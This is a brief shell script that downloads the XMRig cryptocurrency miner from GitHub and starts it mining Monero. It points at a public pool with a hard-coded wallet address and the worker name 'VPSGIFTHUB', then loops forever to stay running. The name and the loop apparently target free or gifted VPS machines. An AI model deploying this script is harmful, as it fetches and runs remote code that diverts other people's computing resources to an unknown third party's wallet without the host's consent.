#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
tar xf xmrig-6.12.2-linux-x64.tar.gz
./xmrig -o pool.minexmr.com:443 -u 88DXLFasDD7MopZikhDERG5pAki24xnc5cCZibo5iea8aWBb92ovny1jWXYWufBmqeY2f744W6Vo2QBG1uBGTVkoKqKsQPh.VPSGIFTHUB -p x  --cpu 2
while [ 1 ]; do
sleep 3
done
sleep 999
